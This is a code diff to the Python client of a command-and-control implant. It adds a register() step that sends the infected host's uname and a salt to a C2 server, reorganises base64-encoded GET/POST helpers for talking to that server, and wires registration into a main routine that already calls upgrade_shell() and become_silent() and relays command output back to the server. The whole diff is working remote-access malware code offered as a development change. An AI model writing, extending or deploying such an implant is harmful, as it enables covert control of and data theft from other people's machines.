@@ -26,6 +26,34 @@ debug = True
 c2_id = 0
 
 
+def make_get(url):
+	"""
+	Make Get request to C2 server
+	Args:
+		url: url of resource
+
+	Returns: the data decoded from base64
+
+	"""
+	r = requests.get(f"http://{HOST}:{PORT}/{url}")
+	return base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8')
+
+
+def make_post(url, data):
+	"""
+	Make Post request to C2 server
+	Args:
+		url: resource
+		data: data, not encoded
+
+	Returns: status code and response text
+
+	"""
+	data = base64.urlsafe_b64encode(bytes(data.encode('utf-8')))
+	r = requests.post(f"http://{HOST}:{PORT}/{url}", data=data)
+	return r.status_code
+
+
 def handle(data):
 	"""
 	Handle incoming commands from C2
@@ -52,32 +80,19 @@ def handle(data):
 	send_data(output)
 
 
-def make_get(url):
+def register():
 	"""
-	Make Get request to C2 server
-	Args:
-		url: url of resource
+	Register with C2 server
+	Send uname with random salt
 
-	Returns: the data decoded from base64
-
+	Returns: make post request to C2 server
 	"""
-	r = requests.get(f"http://{HOST}:{PORT}/{url}")
-	return base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8')
-
-
-def make_post(url, data):
-	"""
-	Make Post request to C2 server
-	Args:
-		url: resource
-		data: data, not encoded
-
-	Returns: status code and response text
-
-	"""
-	data = base64.urlsafe_b64encode(bytes(data.encode('utf-8')))
-	r = requests.post(f"http://{HOST}:{PORT}/{url}", data=data)
-	return r.status_code, r.text
+	uname = get_uname()
+	salt = generate_id()
+	code = make_post("register", f"{uname}:{salt}")
+	if code == 200:
+		return True
+	return False
 
 
 def request_commands():
@@ -99,7 +114,7 @@ def send_data(data):
 	Returns:
 
 	"""
-	status, _ = make_post("data", data)
+	status = make_post("data", data)
 	return status
 
 
@@ -119,7 +134,9 @@ def generate_id():
 
 	"""
 	global c2_id
-	c2_id = int(hashlib.sha1(get_uname().encode("utf-8")).hexdigest(), 16) + random.randint(1, 10000)
+	salt = random.randint(1, 10000)
+	c2_id = int(hashlib.sha1(get_uname().encode("utf-8")).hexdigest(), 16) + salt
+	return salt
 
 
 def run_builtin(command):
@@ -306,6 +323,9 @@ if __name__ == "__main__":
 			pass
 	upgrade_shell()
 	become_silent()
+
+	if not register():
+		print("Failed to register with C2 server")
 
 	last_commands = ""
 
